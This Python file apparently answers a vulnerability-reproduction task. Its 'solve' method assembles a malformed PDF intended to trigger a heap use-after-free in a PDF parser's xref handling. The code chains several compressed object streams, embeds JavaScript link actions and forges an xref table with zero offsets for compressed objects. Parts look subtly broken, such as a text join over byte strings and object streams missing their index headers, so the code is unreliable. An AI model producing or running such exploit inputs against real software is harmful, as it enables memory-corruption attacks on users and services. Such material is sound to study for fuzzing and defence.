import struct
import zlib
import io

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a PDF that triggers heap use-after-free through xref solidification
        # during object stream loading
        
        # Basic PDF structure
        pdf_parts = []
        
        # PDF header
        pdf_parts.append(b"%PDF-1.7\n")
        
        # Object 1: Catalog
        catalog = b"""1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
"""
        pdf_parts.append(catalog)
        
        # Object 2: Pages
        pages = b"""2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
"""
        pdf_parts.append(pages)
        
        # Object 3: Page
        page = b"""3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
/Resources <<
/Font <<
/F1 5 0 R
>>
>>
>>
endobj
"""
        pdf_parts.append(page)
        
        # Object 4: Content stream
        content = b"""4 0 obj
<<
/Length 20
>>
stream
BT /F1 12 Tf 72 720 Td (Test) Tj ET
endstream
endobj
"""
        pdf_parts.append(content)
        
        # Object 5: Font
        font = b"""5 0 obj
<<
/Type /Font
/Subtype /Type1
/BaseFont /Helvetica
>>
endobj
"""
        pdf_parts.append(font)
        
        # Object 6: First object stream containing object 7
        # This object stream will trigger solidification when loaded
        obj6_data = b"""7 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 8 0 R
/Resources <<
/Font <<
/F1 5 0 R
>>
>>
>>
"""
        obj6_stream = zlib.compress(obj6_data)
        obj6_dict = b"""6 0 obj
<<
/Type /ObjStm
/N 1
/First 0
/Length %d
/Filter /FlateDecode
>>
stream
""" % len(obj6_stream)
        pdf_parts.append(obj6_dict)
        pdf_parts.append(obj6_stream)
        pdf_parts.append(b"endstream\nendobj\n")
        
        # Object 7: Defined in object stream 6 (will be loaded from there)
        
        # Object 8: Second content stream (referenced by object 7)
        content2 = b"""8 0 obj
<<
/Length 25
>>
stream
BT /F1 12 Tf 72 700 Td (Test2) Tj ET
endstream
endobj
"""
        pdf_parts.append(content2)
        
        # Object 9: Second object stream containing objects 10-20
        # This creates a chain of object streams that will trigger recursion
        obj9_entries = []
        obj9_data = b""
        for i in range(10, 21):
            obj_data = b"""%d 0 obj
<<
/Type /Annot
/Subtype /Link
/Rect [0 0 100 100]
/Border [0 0 0]
/A <<
/Type /Action
/S /GoTo
/D [3 0 R /Fit]
>>
>>
""" % i
            obj9_entries.append(b"%d 0" % (len(obj9_data)))
            obj9_data += obj_data
        
        obj9_stream = zlib.compress(obj9_data)
        obj9_dict = b"""9 0 obj
<<
/Type /ObjStm
/N 11
/First %d
/Length %d
/Filter /FlateDecode
>>
stream
""" % (len(" ".join(obj9_entries).encode()) + 1, len(obj9_stream))
        
        # Build the object stream with index
        obj9_index = b" ".join(obj9_entries) + b" "
        obj9_full = obj9_index + obj9_stream
        
        pdf_parts.append(obj9_dict)
        pdf_parts.append(obj9_full)
        pdf_parts.append(b"endstream\nendobj\n")
        
        # Objects 10-20: Defined in object stream 9
        
        # Object 21: Third object stream that references object 22 which will be solidified
        obj21_data = b"""22 0 obj
<<
/Type /XObject
/Subtype /Form
/BBox [0 0 100 100]
/Length 10
>>
stream
q 100 0 0 100 0 0 cm BI /W 1 /H 1 /CS /G /BPC 8 ID \xff EI Q
endstream
"""
        obj21_stream = zlib.compress(obj21_data)
        obj21_dict = b"""21 0 obj
<<
/Type /ObjStm
/N 1
/First 0
/Length %d
/Filter /FlateDecode
>>
stream
""" % len(obj21_stream)
        pdf_parts.append(obj21_dict)
        pdf_parts.append(obj21_stream)
        pdf_parts.append(b"endstream\nendobj\n")
        
        # Object 22: Defined in object stream 21
        
        # Object 23: An object that will trigger xref solidification when resolved
        # This object references object 24 which is in yet another object stream
        obj23 = b"""23 0 obj
<<
/Type /Annot
/Subtype /Widget
/Rect [0 0 100 100]
/FT /Tx
/DA (/Helv 10 Tf 0 g)
/T (test)
/V (test)
>>
endobj
"""
        pdf_parts.append(obj23)
        
        # Object 24: Fourth object stream containing object 25
        # This creates a circular reference pattern
        obj24_data = b"""25 0 obj
<<
/Type /Annot
/Subtype /Link
/Rect [0 0 100 100]
/Border [0 0 0]
/A <<
/Type /Action
/S /JavaScript
/JS (app.alert('test'))
>>
>>
"""
        obj24_stream = zlib.compress(obj24_data)
        obj24_dict = b"""24 0 obj
<<
/Type /ObjStm
/N 1
/First 0
/Length %d
/Filter /FlateDecode
>>
stream
""" % len(obj24_stream)
        pdf_parts.append(obj24_dict)
        pdf_parts.append(obj24_stream)
        pdf_parts.append(b"endstream\nendobj\n")
        
        # Object 25: Defined in object stream 24
        
        # Object 26: Fifth object stream with multiple objects that reference each other
        obj26_data = b"""27 0 obj
<<
/Type /Annot
/Subtype /Link
/Rect [0 0 100 100]
/Border [0 0 0]
/A 28 0 R
>>
28 0 obj
<<
/Type /Action
/S /JavaScript
/JS (app.alert('test2'))
>>
29 0 obj
<<
/Type /Annot
/Subtype /Link
/Rect [100 100 200 200]
/Border [0 0 0]
/A 28 0 R
>>
"""
        obj26_stream = zlib.compress(obj26_data)
        obj26_dict = b"""26 0 obj
<<
/Type /ObjStm
/N 3
/First 0
/Length %d
/Filter /FlateDecode
>>
stream
""" % len(obj26_stream)
        pdf_parts.append(obj26_dict)
        pdf_parts.append(obj26_stream)
        pdf_parts.append(b"endstream\nendobj\n")
        
        # Objects 27-29: Defined in object stream 26
        
        # Build xref table
        xref_offset = len(b"".join(pdf_parts))
        xref_table = io.BytesIO()
        
        # Xref entries
        xref_entries = []
        
        # Object 0: free object
        xref_entries.append(b"0000000000 65535 f \n")
        
        # Objects 1-29
        # We need to track the offsets of each object
        pdf_bytes = b"".join(pdf_parts)
        offsets = {}
        
        # Find object offsets
        search_pos = 0
        for obj_num in range(1, 30):
            pattern = b"\n%d 0 obj" % obj_num
            pos = pdf_bytes.find(pattern, search_pos)
            if pos != -1:
                offsets[obj_num] = pos + 1  # +1 to skip the newline
                search_pos = pos + 1
            else:
                # For objects in object streams, use 0 offset (compressed)
                offsets[obj_num] = 0
        
        # Build xref entries
        for obj_num in range(1, 30):
            offset = offsets[obj_num]
            if obj_num in [7, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 25, 27, 28, 29]:
                # These are compressed objects in object streams
                # Use a fake offset that will trigger solidification
                xref_entries.append(b"0000000000 00000 n \n")
            else:
                xref_entries.append(b"%010d 00000 n \n" % offset)
        
        # Write xref section
        xref_table.write(b"xref\n")
        xref_table.write(b"0 %d\n" % (len(xref_entries)))
        for entry in xref_entries:
            xref_table.write(entry)
        
        # Write trailer
        xref_table.write(b"trailer\n")
        xref_table.write(b"<<\n")
        xref_table.write(b"/Size 30\n")
        xref_table.write(b"/Root 1 0 R\n")
        xref_table.write(b"/Info << >>\n")
        xref_table.write(b">>\n")
        xref_table.write(b"startxref\n")
        xref_table.write(b"%d\n" % xref_offset)
        xref_table.write(b"%%EOF\n")
        
        # Combine everything
        final_pdf = pdf_bytes + xref_table.getvalue()
        
        return final_pdf